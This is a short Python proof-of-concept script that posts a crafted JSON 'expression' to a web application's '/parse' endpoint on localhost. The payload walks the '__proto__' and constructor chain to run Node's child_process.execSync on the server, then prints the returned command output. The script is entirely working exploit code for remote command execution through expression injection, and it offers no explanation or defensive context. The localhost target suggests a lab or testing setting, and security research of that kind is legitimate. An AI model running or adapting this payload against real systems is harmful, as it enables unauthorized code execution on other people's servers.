import requests

target_url = "http://localhost:8080/parse"

malicious_payload = {
    "expression": "__proto__.toString.constructor('require(\"child_process\").execSync(\"id\").toString()')()"
}

try:
    print(f"Sending payload to {target_url}...")
    response = requests.post(target_url, json=malicious_payload)

    if response.status_code == 200:
        print("Application response (command output):")
        print(response.json().get("result", "No output"))
    else:
        print(f"Error: Received status code {response.status_code}.")
except Exception as e:
    print(f"Error while sending the payload: {e}")
